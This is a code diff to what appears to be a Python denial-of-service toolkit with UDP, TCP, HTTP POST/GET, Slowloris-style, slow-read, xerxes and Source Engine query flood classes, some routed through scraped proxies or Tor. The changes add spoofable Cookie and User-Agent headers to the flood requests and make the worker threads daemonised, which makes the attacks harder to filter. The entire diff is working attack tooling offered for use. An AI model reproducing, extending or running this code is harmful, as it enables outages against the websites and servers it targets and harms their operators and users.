@@ -47,7 +47,7 @@ def random_param():
  else:
   return random.choice(lis)
 
-def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,post_max):
+def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,post_max,cookie,user_agents):
       pa=random.choice(paths)#bypassing cache engine
       q=''
       for i in range(random.randint(2,5)):
@@ -76,8 +76,11 @@ def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,pos
       for n in range(random.randint(0,5)):
        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
       kl=random.randint(1,2)
+      ck=""
+      if cookie:
+       ck="Cookie: "+cookie+"\r\n"
       if ty==1:
-       m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
+       m='GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,ck,random.choice(user_agents),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
       else:
        k=''
        for _ in range(random.randint(post_field_min,post_field_max)):
@@ -86,7 +89,7 @@ def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,pos
        for x in range(random.randint(post_min,post_max)):
         j+=random.choice(lis)
        par =k+'='+j
-       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
+       m= "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,ck,random.choice(user_agents),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
       return reorder_headers_randomly(m)
 
 def get_public_dns(timeout=15):
@@ -122,7 +125,7 @@ def reset():#reset all values
 '''
 
 class udp_flood:
- def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
+ def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
   self.target=u
   self.port=p
   self.interval=interval
@@ -190,7 +193,7 @@ class udp_flood:
   return a
   
 class vse_flood:
- def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+ def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
   self.target=u
   self.port=p
   self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
@@ -253,7 +256,7 @@ class vse_flood:
 
 
 class tcp_flood:
- def __init__(self,u,p=80,threads_daemon=False,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -346,8 +349,12 @@ class tcp_flood:
 
 
 class http_spam:
- def __init__(self,u,p=80,method=3,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
+  self.cookie=cookie
+  self.user_agents=user_agents
+  if not self.user_agents or len(self.user_agents)==0:
+   self.user_agents=ua
   self.method=method
   self.stop=False
   self.counter=0
@@ -394,7 +401,7 @@ class http_spam:
       req="GET"
      else:
       req="POST"
-     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max)
+     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
      try:
        if self.stop==True:
          break
@@ -430,8 +437,12 @@ class http_spam:
 
 
 class prox_http_spam(threading.Thread):
- def __init__(self,u,p=80,method=3,threads_daemon=False,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
+  self.cookie=cookie
+  self.user_agents=user_agents
+  if not self.user_agents or len(self.user_agents)==0:
+   self.user_agents=ua
   self.method=method
   self.stop=False
   self.counter=0
@@ -507,7 +518,7 @@ class prox_http_spam(threading.Thread):
       req="GET"
      else:
       req="POST"
-     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max)
+     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
      try:
        if stop==True:
          break
@@ -543,8 +554,12 @@ class prox_http_spam(threading.Thread):
 
 
 class torshammer:
- def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,threads_daemon=True,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
   self.counter=0
+  self.cookie=cookie
+  self.user_agents=user_agents
+  if not self.user_agents or len(self.user_agents)==0:
+   self.user_agents=ua
   self.max_content=max_content
   self.min_content=min_content
   self.stop=False
@@ -582,7 +597,10 @@ class torshammer:
         sys.stdout.flush()
         #print("Connected to {}:{}...".format(self.target,self.port))
      q=random.randint(self.min_content,self.max_content)
-     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     ck=""
+     if self.cookie:
+      ck="Cookie: "+self.cookie+"\r\n"
+     s.send("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
      for i in range(q):
       if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
        break
@@ -625,7 +643,11 @@ class torshammer:
 
 
 class prox_hammer:
- def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,threads_daemon=True,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
+  self.cookie=cookie
+  self.user_agents=user_agents
+  if not self.user_agents or len(self.user_agents)==0:
+   self.user_agents=ua
   self.httplist=http_list
   if not self.httplist and self.httplist!=[]:
    self.httplist=masshttp(timeout=scraping_timeout)
@@ -688,7 +710,10 @@ class prox_hammer:
      if ((self.port==443)or(self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
      q=random.randint(self.min_content,self.max_content)
-     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     ck=""
+     if self.cookie:
+      ck="Cookie: "+cookie+"\r\n"
+     s.send("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
      for i in range(q):
       if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
        break
@@ -728,7 +753,7 @@ class prox_hammer:
 
 
 class xerxes:
- def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=True,threads=500,timeout=5,duration=60,logs=False,tor=False):
   self.counter=0
   self.target=u
   self.port=p
@@ -801,7 +826,7 @@ class xerxes:
 
 
 class prox_xerxes:
- def __init__(self,u,scraping_timeout=15,p=80,threads_daemon=False,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
+ def __init__(self,u,scraping_timeout=15,p=80,threads_daemon=True,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
   self.httplist=http_list
   if not self.httplist and self.httplist!=[]:
    self.httplist=masshttp(timeout=scraping_timeout)
@@ -914,8 +939,12 @@ class prox_xerxes:
 '''
 
 class slow_read:
- def __init__(self,u,p=80,paths=["/"],threads_daemon=False,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,paths=["/"],threads_daemon=True,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
   self.counter=0
+  self.cookie=cookie
+  self.user_agents=user_agents
+  if not self.user_agents or len(self.user_agents)==0:
+   self.user_agents=ua
   self.stop=False
   self.target=u
   self.port=p
@@ -956,7 +985,7 @@ class slow_read:
       if self.stop==True:
        break
       try:
-       s.send(setup_http_packet(self.target,3,self.paths,2,8,10,50).encode('utf-8'))
+       s.send(setup_http_packet(self.target,3,self.paths,2,8,10,50,self.cookie,self.user_agents).encode('utf-8'))
        self.counter+=1
        while True:    
         d=s.recv(random.randint(self.read_min,self.read_max))
